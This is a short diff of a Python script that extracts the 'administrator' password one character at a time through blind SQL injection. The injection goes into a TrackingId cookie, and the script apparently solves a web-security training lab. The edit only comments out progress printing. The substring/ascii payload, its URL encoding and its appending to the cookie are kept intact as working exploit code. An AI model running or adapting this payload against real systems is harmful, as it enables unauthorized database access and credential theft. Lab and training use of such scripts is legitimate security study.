@@ -23,9 +23,9 @@ Character is saved in the global variable "password_extracted".
 async def getChar(position, url, session, cookies_in):
     for j in range(32, 126):
         cookies = copy.deepcopy(cookies_in)
-        sys.stdout.write("Trying char %s at pos %s\n" % (chr(j), position))
+        #sys.stdout.write("Trying char %s at pos %s\n" % (chr(j), position))
         #sys.stdout.write("password_extracted: %s" % password_extracted)
-        sys.stdout.flush()
+        #sys.stdout.flush()
         sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (position, j)
         sqli_payload_encoded = urllib.parse.quote(sqli_payload)
         cookies["TrackingId"] = cookies["TrackingId"] + sqli_payload_encoded
